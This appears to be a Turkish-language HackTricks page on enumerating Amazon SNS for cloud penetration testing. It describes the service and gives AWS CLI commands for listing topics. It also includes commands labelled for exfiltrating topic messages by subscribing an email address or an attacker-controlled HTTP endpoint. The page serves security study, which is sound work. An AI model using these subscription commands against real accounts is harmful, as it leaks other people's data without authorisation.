# AWS - SNS Enum

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## SNS

Amazon Basit Bildirim Servisi (Amazon SNS), **tamamen yönetilen bir mesajlaşma servisi** olarak tanımlanır. Hem **uygulama-uygulama** (A2A) hem de **uygulama-kisi** (A2P) iletişim türlerini destekler.

A2A iletişimi için ana özellikler **yayınla/abone ol (pub/sub) mekanizmaları** içerir. Bu mekanizmalar, yüksek verimli, **itme tabanlı, çoktan çoğa mesajlaşmayı** sağlamak için kritik olan **konuları** tanıtır. Bu özellik, dağıtılmış sistemler, mikro hizmetler ve olay odaklı sunucusuz mimariler içeren senaryolar için son derece avantajlıdır. Bu konuları kullanarak, yayıncı sistemler mesajları **geniş bir abone sistemi yelpazesine** verimli bir şekilde dağıtabilir, böylece bir fanout mesajlaşma modeli oluşturur.

### **SQS ile Fark**

**SQS**, nokta-nokta iletişimi sağlayan **kuyruk tabanlı** bir hizmettir ve mesajların **tek bir tüketici** tarafından işlenmesini garanti eder. **En az bir kez teslimat** sunar, standart ve FIFO kuyrukları destekler ve mesajların yeniden denemeler ve gecikmeli işleme için saklanmasına izin verir.\
Öte yandan, **SNS** bir **yayınla/abone ol tabanlı hizmettir**, mesajları **birden fazla aboneye** aynı anda yayınlayarak **birden-çoğa** iletişimi mümkün kılar. **E-posta, SMS, Lambda fonksiyonları ve HTTP/HTTPS** gibi çeşitli abonelik uç noktalarını destekler ve hedefli mesaj teslimatı için filtreleme mekanizmaları sağlar.\
Her iki hizmet de dağıtılmış sistemlerde bileşenler arasında ayrıştırma sağlasa da, SQS kuyruklu iletişime odaklanırken, SNS olay odaklı, fan-out iletişim modellerine vurgu yapar.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**FIFO** türündeki **konular** için yalnızca **SQS** protokolünü kullanan abonelerin kullanılabileceğini unutmayın (HTTP veya HTTPS kullanılamaz).

Ayrıca, `--topic-arn` bölgeyi içerse bile, **`--region`** parametresinde doğru bölgeyi belirttiğinizden emin olun, aksi takdirde erişiminiz olmadığına dair bir hata alırsınız, ancak sorun bölgedir.
{% endhint %}

#### Kimlik Doğrulama Olmadan Erişim

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### Yetki Yükseltme

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### İstismar Sonrası

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Süreklilik

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
